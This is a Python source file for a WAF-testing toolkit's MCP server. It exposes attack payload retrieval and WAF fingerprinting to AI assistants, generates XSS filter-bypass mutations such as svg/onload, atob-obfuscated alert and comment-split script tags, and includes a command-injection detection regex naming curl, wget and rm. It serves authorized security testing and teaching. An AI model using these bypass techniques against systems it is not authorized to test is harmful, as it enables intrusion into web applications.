#!/usr/bin/env python3
"""
Fray MCP Server — Model Context Protocol integration.

Exposes Fray capabilities as MCP tools that AI assistants
(Claude, Windsurf, etc.) can call directly. No copy-paste prompts needed.

Usage:
    # stdio mode (for Claude Desktop, Windsurf, etc.)
    python -m fray.mcp_server

    # Or via the fray CLI
    fray mcp

Configure in Claude Desktop (~/Library/Application Support/Claude/claude_desktop_config.json):
    {
      "mcpServers": {
        "fray": {
          "command": "python",
          "args": ["-m", "fray.mcp_server"]
        }
      }
    }
"""
import json
import sys
import logging
from pathlib import Path
from typing import Optional

# MCP SDK import — optional dependency
try:
    from mcp.server.fastmcp import FastMCP
    MCP_AVAILABLE = True
except ImportError:
    MCP_AVAILABLE = False

# Configure logging to stderr (NEVER stdout for stdio MCP servers)
logging.basicConfig(level=logging.INFO, stream=sys.stderr,
                    format="%(asctime)s [fray-mcp] %(message)s")
logger = logging.getLogger(__name__)

# Package paths
PKG_DIR = Path(__file__).resolve().parent
PAYLOADS_DIR = PKG_DIR / "payloads"


def _list_categories() -> list[dict]:
    """List payload categories with file counts."""
    cats = []
    for d in sorted(PAYLOADS_DIR.iterdir()):
        if d.is_dir():
            json_count = len(list(d.glob("*.json")))
            txt_count = len(list(d.glob("*.txt")))
            cats.append({
                "name": d.name,
                "json_files": json_count,
                "txt_files": txt_count,
                "total_files": json_count + txt_count,
            })
    return cats


def _load_payloads(category: str, max_payloads: int = 50) -> list[dict]:
    """Load payloads from a category directory."""
    cat_dir = PAYLOADS_DIR / category
    if not cat_dir.exists():
        return []
    payloads = []
    for jf in sorted(cat_dir.glob("*.json")):
        try:
            data = json.loads(jf.read_text(encoding="utf-8"))
            plist = data.get("payloads", data) if isinstance(data, dict) else data
            if isinstance(plist, list):
                for p in plist:
                    payloads.append(p)
                    if len(payloads) >= max_payloads:
                        return payloads
        except Exception:
            continue
    return payloads


def _get_waf_signatures() -> dict:
    """Get all WAF signatures from the detector."""
    from fray.detector import WAFDetector
    d = WAFDetector()
    result = {}
    for name, sig in d.waf_signatures.items():
        result[name] = {
            "headers": sig.get("headers", []),
            "cookies": sig.get("cookies", []),
            "server": sig.get("server", []),
            "response_codes": sig.get("response_codes", []),
        }
    return result


# ── Standalone tool implementations (testable without MCP SDK) ────────────────

def _analyze_scan_results(results_json: str) -> str:
    """Analyze Fray scan results and propose next steps."""
    try:
        data = json.loads(results_json)
    except (json.JSONDecodeError, TypeError):
        return "Error: Invalid JSON. Provide the raw JSON output from 'fray test -o output.json' or 'fray bounty -o output.json'."

    targets = data.get("targets", [data]) if isinstance(data, dict) else [data]

    lines = ["# Fray Scan Analysis", ""]
    total_bypasses = 0
    all_recommendations = []

    for t in targets:
        url = t.get("url", t.get("target", "unknown"))
        waf = t.get("waf", "unknown")
        block_rate = t.get("block_rate", 0)
        total_tested = t.get("total_tested", 0)
        total_passed = t.get("total_passed", 0)

        lines.append(f"## Target: {url}")
        lines.append(f"- WAF: {waf}")
        lines.append(f"- Block Rate: {block_rate}%")
        lines.append(f"- Tested: {total_tested} | Blocked: {t.get('total_blocked', 0)} | Bypassed: {total_passed}")

        if block_rate < 50:
            risk = "CRITICAL — WAF is largely ineffective"
        elif block_rate < 80:
            risk = "HIGH — significant bypass surface"
        elif block_rate < 95:
            risk = "MEDIUM — some bypasses found"
        else:
            risk = "LOW — WAF is well-configured"
        lines.append(f"- Risk Level: **{risk}**")
        lines.append("")

        for cat, cr in t.get("categories", {}).items():
            bypassed = cr.get("bypassed", [])
            if not bypassed:
                continue
            total_bypasses += len(bypassed)
            lines.append(f"### {cat.upper()} — {len(bypassed)} bypass(es)")

            reflected_count = sum(1 for b in bypassed if b.get("reflected"))
            if reflected_count:
                lines.append(f"⚠️  {reflected_count} payload(s) reflected in response (confirmed exploitable)")

            for b in bypassed[:5]:
                pl = b.get("payload", "")[:100]
                status = b.get("status", "?")
                ref = "✅ REFLECTED" if b.get("reflected") else ""
                lines.append(f"  - `{pl}` (HTTP {status}) {ref}")
            if len(bypassed) > 5:
                lines.append(f"  - ... and {len(bypassed) - 5} more")
            lines.append("")

            if reflected_count:
                all_recommendations.append(
                    f"**{cat.upper()} on {url}**: {reflected_count} reflected bypasses — "
                    f"write HackerOne report immediately. Run: `fray bounty --urls <file> -c {cat}`"
                )
            elif bypassed:
                all_recommendations.append(
                    f"**{cat.upper()} on {url}**: {len(bypassed)} bypasses passed WAF but not reflected. "
                    f"Try with `--smart` to generate mutations: `fray test {url} -c {cat} --smart --max 50`"
                )

        es = t.get("evolve_stats")
        if es:
            lines.append("### Adaptive Engine Stats")
            lines.append(f"- Probes: {es.get('probes_sent', 0)}")
            lines.append(f"- Payloads skipped: {es.get('payloads_skipped', 0)}")
            lines.append(f"- Efficiency gain: {es.get('efficiency_gain', 0)}%")
            lines.append(f"- WAF strictness: {es.get('waf_strictness', '?')}")
            if es.get("allowed_tags"):
                lines.append(f"- Allowed tags: {', '.join(es['allowed_tags'])}")
            lines.append("")

    lines.append("## Recommended Next Steps")
    lines.append("")
    if total_bypasses == 0:
        lines.append("1. WAF appears well-configured. Try different categories:")
        lines.append("   `fray test <url> -c sqli,ssrf,ssti --smart --max 50`")
        lines.append("2. Try encoded/obfuscated payloads:")
        lines.append("   `fray test <url> -c xss --smart --max 100`")
        lines.append("3. Test with different HTTP methods (POST):")
        lines.append("   `fray test <url> -c xss --method POST`")
    else:
        for i, rec in enumerate(all_recommendations, 1):
            lines.append(f"{i}. {rec}")
        lines.append(f"{len(all_recommendations) + 1}. Generate a professional report:")
        lines.append("   `fray bounty --urls targets.txt -o report.json`")

    lines.append("")
    lines.append(f"**Total bypasses found: {total_bypasses}**")
    return "\n".join(lines)


def _generate_bypass_strategy(waf_vendor: str, blocked_payload: str) -> str:
    """Generate bypass strategies for a payload blocked by a specific WAF."""
    import re as _re

    payload = blocked_payload
    vendor = waf_vendor

    lines = [f"# Bypass Strategy: {vendor}", f"Blocked payload: `{payload[:120]}`", ""]

    has_script = bool(_re.search(r'<script', payload, _re.I))
    has_event = bool(_re.search(r'\bon\w+\s*=', payload, _re.I))
    has_alert = bool(_re.search(r'(alert|confirm|prompt)\s*[\(`]', payload, _re.I))
    has_iframe = bool(_re.search(r'<iframe', payload, _re.I))
    has_js_proto = bool(_re.search(r'javascript:', payload, _re.I))
    has_angle = '<' in payload and '>' in payload
    has_parens = '(' in payload and ')' in payload

    lines.append("## Likely Block Triggers")
    triggers = []
    if has_script:
        triggers.append("`<script>` tag — most WAFs block this aggressively")
    if has_alert:
        triggers.append("`alert()` / `confirm()` / `prompt()` — common WAF signatures")
    if has_event:
        triggers.append("Event handler (`onerror=`, `onload=`, etc.) — keyword match")
    if has_js_proto:
        triggers.append("`javascript:` protocol — URI-based detection")
    if has_iframe:
        triggers.append("`<iframe>` tag — framing attack detection")
    if not triggers:
        triggers.append("Combination of HTML characters and suspicious patterns")
    for t in triggers:
        lines.append(f"- {t}")
    lines.append("")

    lines.append("## Suggested Bypass Mutations")
    lines.append("")
    mutation_count = 0

    if has_script:
        lines.append("### 1. Replace `<script>` with alternative tags")
        lines.append("```")
        alt = _re.sub(r'<script[^>]*>', '<svg/onload=', payload, flags=_re.I)
        alt = _re.sub(r'</script>', '>', alt, flags=_re.I)
        lines.append(alt[:200])
        lines.append("```")
        lines.append("```")
        alt2 = _re.sub(r'<script[^>]*>(.*?)</script>', r'<img src=x onerror=\1>', payload, flags=_re.I)
        lines.append(alt2[:200])
        lines.append("```")
        lines.append("")
        mutation_count += 1

    if has_alert:
        lines.append(f"### {mutation_count + 1}. Obfuscate function calls")
        lines.append("```")
        lines.append(payload.replace("alert(", "top['al'+'ert'](")[:200])
        lines.append("```")
        lines.append("```")
        lines.append(payload.replace("alert(1)", "self[atob('YWxlcnQ=')](1)")[:200])
        lines.append("```")
        lines.append("```")
        lines.append(payload.replace("alert", "\\u0061lert")[:200])
        lines.append("```")
        lines.append("")
        mutation_count += 1

    if has_event:
        lines.append(f"### {mutation_count + 1}. Event handler alternatives")
        events = _re.findall(r'\b(on\w+)\s*=', payload, _re.I)
        if events:
            original_event = events[0]
            alt_events = {
                "onerror": ["onfocus", "onmouseover", "ontoggle", "onanimationend"],
                "onload": ["onfocus", "onauxclick", "onbeforeinput"],
                "onclick": ["onpointerdown", "ontouchstart", "onfocusin"],
                "onmouseover": ["onpointerenter", "onfocusin"],
            }
            suggestions = alt_events.get(original_event.lower(), ["onfocus", "ontoggle"])
            for s in suggestions[:3]:
                alt = payload.replace(original_event, s, 1)
                lines.append(f"```\n{alt[:200]}\n```")
            lines.append("")
        mutation_count += 1

    if has_angle:
        lines.append(f"### {mutation_count + 1}. HTML entity / encoding bypass")
        lines.append("```")
        lines.append(payload.replace("<", "&lt;").replace(">", "&gt;")[:200])
        lines.append("```")
        lines.append("```")
        lines.append(payload.replace("<", "%3C").replace(">", "%3E")[:200])
        lines.append("```")
        lines.append("```")
        if '<script' in payload.lower():
            lines.append(payload.replace("<script", "<scr<!--X-->ipt", 1)[:200])
        else:
            lines.append(payload.replace("<", "<\x00", 1)[:200])
        lines.append("```")
        lines.append("")
        mutation_count += 1

    if has_parens:
        lines.append(f"### {mutation_count + 1}. Parenthesis-free execution")
        lines.append("```")
        alt = _re.sub(r'(alert|confirm|prompt)\(([^)]*)\)', r'\1`\2`', payload)
        lines.append(alt[:200])
        lines.append("```")
        lines.append("```")
        lines.append(payload.replace("(", "\\x28").replace(")", "\\x29")[:200])
        lines.append("```")
        lines.append("")
        mutation_count += 1

    lines.append("## WAF-Specific Notes")
    vendor_lower = vendor.lower()

    # Load WAF intelligence knowledge base
    from fray import load_waf_intel
    intel = load_waf_intel()
    vendors_db = intel.get("vendors", {})
    technique_matrix = intel.get("technique_matrix", {})

    # Match vendor to intel key
    vendor_key = None
    for key in vendors_db:
        if key.replace("_", " ") in vendor_lower or vendor_lower in key.replace("_", " "):
            vendor_key = key
            break
    # Fuzzy fallback
    if not vendor_key:
        for key, data in vendors_db.items():
            if vendor_lower in data.get("display_name", "").lower():
                vendor_key = key
                break

    if vendor_key and vendor_key in vendors_db:
        vdata = vendors_db[vendor_key]
        lines.append(f"### {vdata['display_name']} — Intelligence from WAF Knowledge Base")
        lines.append(f"- Detection mode: **{vdata.get('detection_mode', 'unknown')}**")
        lines.append("")

        # Effective techniques
        effective = vdata.get("bypass_techniques", {}).get("effective", [])
        if effective:
            lines.append("**Effective bypass techniques:**")
            for t in effective:
                conf = t.get("confidence", "?")
                lines.append(f"- **{t['technique']}** (confidence: {conf}): {t['description']}")
                if t.get("payload_example"):
                    lines.append(f"  - Example: `{t['payload_example'][:100]}`")
            lines.append("")

        # Ineffective techniques (avoid wasting time)
        ineffective = vdata.get("bypass_techniques", {}).get("ineffective", [])
        if ineffective:
            lines.append("**Known ineffective (skip these):**")
            for t in ineffective:
                lines.append(f"- ~~{t['technique']}~~ — {t.get('description', '')}")
            lines.append("")

        # Detection gaps
        gaps = vdata.get("detection_gaps", {})
        sig_misses = gaps.get("signature", {}).get("misses", [])
        anom_misses = gaps.get("anomaly", {}).get("misses", [])
        if sig_misses or anom_misses:
            lines.append("**Detection gaps:**")
            if sig_misses:
                lines.append(f"- Signature misses: {', '.join(sig_misses)}")
            if anom_misses:
                lines.append(f"- Anomaly misses: {', '.join(anom_misses)}")
            lines.append("")

        # Recommended categories
        rec_cats = vdata.get("recommended_categories", [])
        if rec_cats:
            lines.append(f"**Recommended payload categories:** {', '.join(rec_cats)}")
            lines.append(f"- Try: `fray test <url> -c {rec_cats[0]} --smart --max 100`")

        # Recommended delay
        delay = vdata.get("recommended_delay")
        if delay:
            lines.append(f"- Safe testing delay: **{delay}s** between requests")
    else:
        # Fallback to hardcoded notes
        if "cloudflare" in vendor_lower:
            lines.append("- Cloudflare uses ML + regex rules. Mixed-case and Unicode escapes often work.")
            lines.append("- `<svg>` and `<math>` tags are less monitored than `<script>`.")
            lines.append("- Template literals (backticks) can bypass parenthesis detection.")
            lines.append("- Try: `fray test <url> -c xss --smart --max 100`")
        elif "akamai" in vendor_lower:
            lines.append("- Akamai Kona has aggressive regex rules. Double-encoding helps.")
            lines.append("- Try less common event handlers: `ontoggle`, `onanimationend`.")
        elif "aws" in vendor_lower:
            lines.append("- AWS WAF rules are often custom. Test each rule group separately.")
            lines.append("- JSON payloads in body may bypass query-string-only rules.")
        elif "imperva" in vendor_lower or "incapsula" in vendor_lower:
            lines.append("- Incapsula/Imperva blocks most common payloads aggressively.")
            lines.append("- Comment injection and null bytes are effective.")
        else:
            lines.append(f"- No specific intel for {vendor}. Try encoding and tag substitution.")
            lines.append("- Run adaptive mode: `fray test <url> -c xss --smart --max 100`")

    # Cross-vendor technique matrix
    if technique_matrix:
        lines.append("")
        lines.append("## Cross-Vendor Technique Matrix")
        for tech_name, tech_data in technique_matrix.items():
            if not isinstance(tech_data, dict):
                continue
            effective_against = tech_data.get("effective_against", [])
            blocked_by = tech_data.get("blocked_by", [])
            if vendor_key and vendor_key in effective_against:
                lines.append(f"- ✅ **{tech_name}** — effective against this vendor")
            elif vendor_key and vendor_key in blocked_by:
                lines.append(f"- ❌ **{tech_name}** — blocked by this vendor")

    lines.append("")
    lines.append(f"**Total mutations suggested: {mutation_count} strategies**")
    return "\n".join(lines)


def _explain_vulnerability(payload: str, category: str = "") -> str:
    """Explain why a payload is dangerous, in beginner-friendly terms."""
    import re as _re

    lines = ["# Vulnerability Explanation", f"Payload: `{payload[:150]}`", ""]

    detected = category.lower() if category else ""
    if not detected:
        if _re.search(r'<[a-z]+[^>]*>|on\w+=|javascript:', payload, _re.I):
            detected = "xss"
        elif _re.search(r"(union|select|insert|drop|--|')\s", payload, _re.I):
            detected = "sqli"
        elif _re.search(r'(127\.0\.0\.1|localhost|169\.254|internal|metadata)', payload, _re.I):
            detected = "ssrf"
        elif _re.search(r'(\{\{|\$\{|<%|#\{)', payload):
            detected = "ssti"
        elif _re.search(r'(;|&&|\||\$\(|`)\s*(ls|cat|id|whoami|curl|wget|rm)', payload, _re.I):
            detected = "command_injection"
        elif _re.search(r'<!ENTITY|SYSTEM\s+"', payload, _re.I):
            detected = "xxe"
        elif _re.search(r'(ignore|disregard|pretend|system prompt|jailbreak)', payload, _re.I):
            detected = "prompt_injection"
        else:
            detected = "unknown"

    vuln_info = {
        "xss": {"name": "Cross-Site Scripting (XSS)", "cwe": "CWE-79", "owasp": "A03:2021 — Injection", "icon": "🔴"},
        "sqli": {"name": "SQL Injection", "cwe": "CWE-89", "owasp": "A03:2021 — Injection", "icon": "🔴"},
        "ssrf": {"name": "Server-Side Request Forgery (SSRF)", "cwe": "CWE-918", "owasp": "A10:2021 — SSRF", "icon": "🟠"},
        "ssti": {"name": "Server-Side Template Injection (SSTI)", "cwe": "CWE-1336", "owasp": "A03:2021 — Injection", "icon": "🔴"},
        "command_injection": {"name": "OS Command Injection", "cwe": "CWE-78", "owasp": "A03:2021 — Injection", "icon": "🔴"},
        "xxe": {"name": "XML External Entity (XXE)", "cwe": "CWE-611", "owasp": "A05:2021 — Security Misconfiguration", "icon": "🟠"},
        "prompt_injection": {"name": "LLM Prompt Injection", "cwe": "CWE-77 (Command Injection variant)", "owasp": "OWASP LLM Top 10 — LLM01: Prompt Injection", "icon": "🟡"},
    }

    info = vuln_info.get(detected, {
        "name": f"Unknown ({detected})", "cwe": "CWE-20 (Improper Input Validation)",
        "owasp": "A03:2021 — Injection", "icon": "⚪",
    })

    lines.append(f"## {info['icon']} {info['name']}")
    lines.append(f"- **CWE**: {info['cwe']}")
    lines.append(f"- **OWASP**: {info['owasp']}")
    lines.append("")

    explanations = {
        "xss": {
            "how": ("This payload tries to inject JavaScript code into a web page. "
                    "When a victim visits the page, the injected code runs in their browser "
                    "as if it came from the trusted website."),
            "steps": [
                "Attacker finds an input field that reflects user input (search box, comment, URL parameter)",
                "Attacker crafts a payload containing HTML/JavaScript code",
                "The server includes the payload in the response without sanitizing it",
                "Victim's browser executes the injected code with the website's permissions",
            ],
            "damage": [
                "Steal session cookies → attacker hijacks victim's account",
                "Redirect to phishing pages → steal credentials",
                "Modify page content → deface the website or trick the user",
                "Keylog inputs → capture passwords and credit card numbers",
            ],
            "defense": [
                "Escape all user input before rendering in HTML (use framework auto-escaping)",
                "Set Content-Security-Policy header to restrict inline scripts",
                "Use HttpOnly flag on session cookies",
                "Validate and sanitize input on the server side",
            ],
        },
        "sqli": {
            "how": ("This payload manipulates a SQL query by injecting SQL syntax through user input. "
                    "If the application builds SQL queries by concatenating strings, the attacker's "
                    "SQL code becomes part of the query."),
            "steps": [
                "Attacker identifies an input that is used in a SQL query (login form, search, ID parameter)",
                "Attacker adds SQL syntax (quotes, UNION, OR 1=1) to the input",
                "The server concatenates the input into a SQL query without parameterization",
                "The database executes the modified query, returning unauthorized data",
            ],
            "damage": [
                "Read entire database → leak user data, passwords, credit cards",
                "Bypass authentication → log in as admin without password",
                "Modify or delete data → corrupt business-critical records",
                "Execute system commands → full server compromise (in some databases)",
            ],
            "defense": [
                "Use parameterized queries / prepared statements (NEVER string concatenation)",
                "Use an ORM (SQLAlchemy, ActiveRecord, etc.)",
                "Apply least-privilege database permissions",
                "Validate input type (expect integer? reject strings)",
            ],
        },
        "ssrf": {
            "how": ("This payload tricks the server into making HTTP requests to internal resources. "
                    "The attacker provides a URL pointing to internal services (like cloud metadata endpoints) "
                    "that are only accessible from inside the network."),
            "steps": [
                "Attacker finds a feature that fetches URLs (image preview, URL import, webhooks)",
                "Attacker supplies an internal URL (e.g. http://169.254.169.254/latest/meta-data/)",
                "The server fetches the URL from its internal network position",
                "Internal data (cloud credentials, config) is returned to the attacker",
            ],
            "damage": [
                "Steal cloud credentials (AWS keys, GCP tokens) from metadata API",
                "Access internal services (databases, admin panels) not exposed to internet",
                "Port scan internal network from the server's perspective",
                "Pivot to deeper attacks using stolen internal credentials",
            ],
            "defense": [
                "Allowlist permitted destination hosts/IPs",
                "Block requests to private IP ranges (10.x, 172.16.x, 169.254.x)",
                "Disable HTTP redirects in server-side HTTP clients",
                "Use network-level segmentation",
            ],
        },
        "ssti": {
            "how": ("This payload injects code into a server-side template engine (Jinja2, Twig, etc.). "
                    "If user input is embedded directly into a template, the attacker's code "
                    "is executed on the server — not the browser."),
            "steps": [
                "Attacker finds input rendered by a template engine (error messages, emails, previews)",
                "Attacker submits template syntax like {{7*7}} to test for injection",
                "If the server returns '49', the template engine evaluated the expression",
                "Attacker escalates to remote code execution via template builtins",
            ],
            "damage": [
                "Remote code execution on the server → full system compromise",
                "Read server files (source code, configuration, secrets)",
                "Establish reverse shell → persistent access",
                "Pivot to other systems in the network",
            ],
            "defense": [
                "Never embed user input directly in templates",
                "Use sandboxed template rendering",
                "Restrict template engine features (disable dangerous filters/functions)",
                "Validate input and reject template syntax characters",
            ],
        },
        "command_injection": {
            "how": ("This payload injects OS commands into a server-side system call. "
                    "If the application passes user input to a shell command (ping, nslookup, etc.), "
                    "the attacker's commands execute with the server's privileges."),
            "steps": [
                "Attacker finds input passed to a system command (ping tool, file converter, DNS lookup)",
                "Attacker appends shell metacharacters (; && | `) and a command",
                "The server executes the original command AND the injected command",
                "The attacker's command output is returned or the action is performed silently",
            ],
            "damage": [
                "Full remote code execution on the server",
                "Read/modify/delete any file the web server can access",
                "Install backdoors, crypto miners, or ransomware",
                "Pivot to internal network, attack other servers",
            ],
            "defense": [
                "Avoid calling OS commands from application code entirely",
                "If unavoidable, use parameterized APIs (not shell=True)",
                "Validate input against strict allowlists (only expected characters)",
                "Run the application with minimal OS privileges",
            ],
        },
    }

    exp = explanations.get(detected, {
        "how": f"This payload attempts a {info['name']} attack by injecting malicious input.",
        "steps": ["Attacker crafts malicious input", "Application processes it unsafely", "Attacker achieves unauthorized access"],
        "damage": ["Data breach", "Unauthorized access", "System compromise"],
        "defense": ["Validate all input", "Use security frameworks", "Apply defense in depth"],
    })

    lines.append("## How It Works (Simple)")
    lines.append(exp["how"])
    lines.append("")
    lines.append("## Step-by-Step Attack Flow")
    for i, step in enumerate(exp["steps"], 1):
        lines.append(f"{i}. {step}")
    lines.append("")
    lines.append("## Potential Damage")
    for d in exp["damage"]:
        lines.append(f"- {d}")
    lines.append("")
    lines.append("## How to Defend Against This")
    for d in exp["defense"]:
        lines.append(f"- {d}")
    lines.append("")

    lines.append("## Payload Breakdown")
    if detected == "xss":
        tags = _re.findall(r'<(\w+)', payload)
        events = _re.findall(r'\b(on\w+)\s*=', payload, _re.I)
        funcs = _re.findall(r'(alert|confirm|prompt|eval|Function)\b', payload, _re.I)
        if tags:
            lines.append(f"- HTML tags used: `{'`, `'.join(set(tags))}`")
        if events:
            lines.append(f"- Event handlers: `{'`, `'.join(set(events))}`")
        if funcs:
            lines.append(f"- JS functions: `{'`, `'.join(set(funcs))}`")
        if 'atob' in payload or 'base64' in payload.lower():
            lines.append("- Uses Base64 encoding to evade WAF detection")
        if '\\u' in payload or '\\x' in payload:
            lines.append("- Uses Unicode/hex escaping to evade pattern matching")
    elif detected == "sqli":
        if 'union' in payload.lower():
            lines.append("- UNION-based: combines attacker query with original to extract data")
        if "' or " in payload.lower() or "1=1" in payload:
            lines.append("- Boolean-based: manipulates WHERE clause to always be true")
        if '--' in payload:
            lines.append("- Uses SQL comments (--) to truncate the rest of the query")

    return "\n".join(lines)


def _create_custom_payload(description: str, category: str = "xss",
                           target_waf: str = "") -> str:
    """Generate payloads from a natural language description."""
    import re as _re

    desc_lower = description.lower()
    lines = ["# Custom Payload Generation", f"Request: {description}", ""]

    payloads = _load_payloads(category, max_payloads=500)
    if not payloads:
        available = [d.name for d in PAYLOADS_DIR.iterdir() if d.is_dir()]
        return (f"No payloads in category '{category}'.\n"
                f"Available: {', '.join(sorted(available))}")

    keywords = set(_re.findall(r'\b[a-z]{3,}\b', desc_lower))
    keywords -= {"the", "and", "for", "that", "this", "with", "using", "from",
                 "test", "want", "payload", "need", "try", "like", "make"}

    scored = []
    for p in payloads:
        if not isinstance(p, dict):
            continue
        text = json.dumps(p).lower()
        score = sum(3 for kw in keywords if kw in text)

        if "svg" in desc_lower and "<svg" in text:
            score += 10
        if "img" in desc_lower and "<img" in text:
            score += 10
        if "math" in desc_lower and "<math" in text:
            score += 10
        if "encod" in desc_lower and ("encod" in text or "&#" in text or "%3" in text):
            score += 8
        if "bypass" in desc_lower and "bypass" in text:
            score += 8
        if "dom" in desc_lower and "dom" in text:
            score += 8
        if "blind" in desc_lower and "blind" in text:
            score += 8
        if "union" in desc_lower and "union" in text:
            score += 10
        if "time" in desc_lower and ("sleep" in text or "delay" in text or "time" in text):
            score += 8
        if "template" in desc_lower and ("{{" in text or "${" in text):
            score += 10
        if "reverse" in desc_lower and "reverse" in text:
            score += 10
        if "base64" in desc_lower and ("base64" in text or "atob" in text):
            score += 10
        if "polyglot" in desc_lower and "polyglot" in text:
            score += 10
        if "event" in desc_lower and _re.search(r'on\w+=', text):
            score += 5

        if target_waf:
            tested = p.get("tested_against", [])
            if any(target_waf.lower() in t.lower() for t in tested):
                score += 5
            if not p.get("blocked", True):
                score += 3

        scored.append((score, p))

    scored.sort(key=lambda x: x[0], reverse=True)
    top = scored[:10]

    lines.append(f"## Best Matching Payloads ({category.upper()})")
    if target_waf:
        lines.append(f"Optimized for: {target_waf}")
    lines.append("")

    for i, (score, p) in enumerate(top, 1):
        pl = p.get("payload", str(p))
        desc = p.get("description", "")
        pid = p.get("id", f"#{i}")
        technique = p.get("technique", "")
        lines.append(f"### {i}. [{pid}] (relevance: {score})")
        lines.append(f"```\n{pl}\n```")
        if desc:
            lines.append(f"*{desc}*")
        if technique:
            lines.append(f"Technique: {technique}")
        lines.append("")

    if top and any(kw in desc_lower for kw in ["bypass", "evade", "waf", "encode", "obfuscate"]):
        lines.append("## Suggested Mutations")
        lines.append("Apply these transformations to increase bypass probability:")
        lines.append("")
        best_payload = top[0][1].get("payload", "")
        if best_payload:
            lines.append(f"Original: `{best_payload[:120]}`")
            lines.append("")
            if _re.search(r'<[a-z]+', best_payload):
                case_mut = _re.sub(r'<([a-z]+)', lambda m: f'<{m.group(1).upper()}', best_payload)
                lines.append(f"1. **Case mutation**: `{case_mut[:120]}`")
            if '<script' in best_payload.lower():
                comment_mut = best_payload.replace('<script', '<scr<!--X-->ipt', 1)
                lines.append(f"2. **Comment injection**: `{comment_mut[:120]}`")
            if 'alert(1)' in best_payload:
                bt_mut = best_payload.replace('alert(1)', 'alert`1`')
                lines.append(f"3. **Backtick (no parens)**: `{bt_mut[:120]}`")

    lines.append("")
    lines.append("**Tip**: Use `fray test <url> -c {cat} --smart` to auto-test with adaptive mutation engine.".format(cat=category))
    return "\n".join(lines)


# ── MCP Server ────────────────────────────────────────────────────────────────

def create_server() -> "FastMCP":
    """Create and configure the MCP server with Fray tools."""

    mcp = FastMCP(
        "fray",
        instructions="Fray v3.1.0 — open-source WAF security testing toolkit. "
                     "5,500+ payloads, 25 WAF fingerprints, 10 MCP tools for AI workflows.",
    )

    # ── Tool: list_categories ──────────────────────────────────────────

    @mcp.tool()
    async def list_payload_categories() -> str:
        """List all available payload categories in Fray.

        Returns a summary of each category with file counts.
        Use this to discover what attack types are available before
        retrieving specific payloads.
        """
        cats = _list_categories()
        lines = ["Fray Payload Categories", "=" * 40, ""]
        total_files = 0
        for c in cats:
            lines.append(f"  {c['name']:30s}  {c['total_files']} files")
            total_files += c["total_files"]
        lines.append("")
        lines.append(f"Total: {len(cats)} categories, {total_files} files")
        return "\n".join(lines)

    # ── Tool: get_payloads ─────────────────────────────────────────────

    @mcp.tool()
    async def get_payloads(category: str, max_results: int = 20) -> str:
        """Retrieve payloads from a specific category.

        Args:
            category: Category name (e.g. xss, sqli, ssrf, ssti, iot_rce,
                      command_injection, ai_prompt_injection, etc.)
            max_results: Maximum number of payloads to return (default 20, max 100)
        """
        max_results = min(max_results, 100)
        available = [d.name for d in PAYLOADS_DIR.iterdir() if d.is_dir()]
        if category not in available:
            return (f"Category '{category}' not found.\n"
                    f"Available: {', '.join(sorted(available))}")

        payloads = _load_payloads(category, max_payloads=max_results)
        if not payloads:
            return f"No payloads found in category '{category}'."

        lines = [f"Fray — {category} payloads ({len(payloads)} shown)", ""]
        for i, p in enumerate(payloads, 1):
            if isinstance(p, dict):
                payload = p.get("payload", str(p))
                desc = p.get("description", "")
                pid = p.get("id", f"#{i}")
                lines.append(f"[{pid}] {payload}")
                if desc:
                    lines.append(f"       → {desc}")
            else:
                lines.append(f"[{i}] {p}")
        return "\n".join(lines)

    # ── Tool: search_payloads ──────────────────────────────────────────

    @mcp.tool()
    async def search_payloads(query: str, max_results: int = 20) -> str:
        """Search across all payload categories for a specific pattern or keyword.

        Args:
            query: Search term (e.g. 'log4j', 'reverse shell', 'base64', 'xmlrpc')
            max_results: Maximum results to return (default 20, max 50)
        """
        max_results = min(max_results, 50)
        query_lower = query.lower()
        matches = []

        for cat_dir in sorted(PAYLOADS_DIR.iterdir()):
            if not cat_dir.is_dir():
                continue
            for jf in cat_dir.glob("*.json"):
                try:
                    data = json.loads(jf.read_text(encoding="utf-8"))
                    plist = data.get("payloads", data) if isinstance(data, dict) else data
                    if not isinstance(plist, list):
                        continue
                    for p in plist:
                        if not isinstance(p, dict):
                            continue
                        searchable = json.dumps(p).lower()
                        if query_lower in searchable:
                            matches.append({
                                "category": cat_dir.name,
                                "file": jf.name,
                                **p
                            })
                            if len(matches) >= max_results:
                                break
                except Exception:
                    continue
                if len(matches) >= max_results:
                    break
            if len(matches) >= max_results:
                break

        if not matches:
            return f"No payloads matching '{query}' found."

        lines = [f"Search results for '{query}' ({len(matches)} matches)", ""]
        for m in matches:
            lines.append(f"[{m.get('category')}/{m.get('id', '?')}] {m.get('payload', '')[:120]}")
            if m.get("description"):
                lines.append(f"       → {m['description']}")
        return "\n".join(lines)

    # ── Tool: get_waf_signatures ───────────────────────────────────────

    @mcp.tool()
    async def get_waf_signatures(vendor: Optional[str] = None) -> str:
        """Get WAF detection signatures for fingerprinting.

        Args:
            vendor: Optional vendor name filter (e.g. 'Cloudflare', 'AWS').
                    If omitted, returns all 25 vendors.
        """
        sigs = _get_waf_signatures()
        if vendor:
            vendor_lower = vendor.lower()
            filtered = {k: v for k, v in sigs.items() if vendor_lower in k.lower()}
            if not filtered:
                return (f"No WAF vendor matching '{vendor}'.\n"
                        f"Available: {', '.join(sorted(sigs.keys()))}")
            sigs = filtered

        lines = [f"WAF Detection Signatures ({len(sigs)} vendors)", ""]
        for name, sig in sorted(sigs.items()):
            lines.append(f"■ {name}")
            lines.append(f"  Headers: {', '.join(sig['headers'][:5])}")
            lines.append(f"  Cookies: {', '.join(sig['cookies'][:5])}")
            lines.append(f"  Server:  {', '.join(sig['server'])}")
            lines.append(f"  Status:  {sig['response_codes']}")
            lines.append("")
        return "\n".join(lines)

    # ── Tool: get_cve_details ──────────────────────────────────────────

    @mcp.tool()
    async def get_cve_details(cve_id: str) -> str:
        """Look up a specific CVE across all Fray payload files.

        Args:
            cve_id: CVE identifier (e.g. 'CVE-2026-27509')
        """
        cve_upper = cve_id.upper()
        results = []

        for jf in sorted(PAYLOADS_DIR.rglob("*.json")):
            try:
                data = json.loads(jf.read_text(encoding="utf-8"))
                if not isinstance(data, dict):
                    continue
                file_cve = data.get("cve", "")
                if cve_upper in str(file_cve).upper():
                    results.append({
                        "file": str(jf.relative_to(PAYLOADS_DIR)),
                        "title": data.get("title", ""),
                        "severity": data.get("severity", ""),
                        "cwe": data.get("cwe", ""),
                        "affected": data.get("affected", {}),
                        "description": data.get("description", ""),
                        "payload_count": len(data.get("payloads", [])),
                        "references": data.get("references", []),
                    })
            except Exception:
                continue

        if not results:
            return f"No payloads found for {cve_id}."

        lines = []
        for r in results:
            lines.append(f"CVE: {cve_id}")
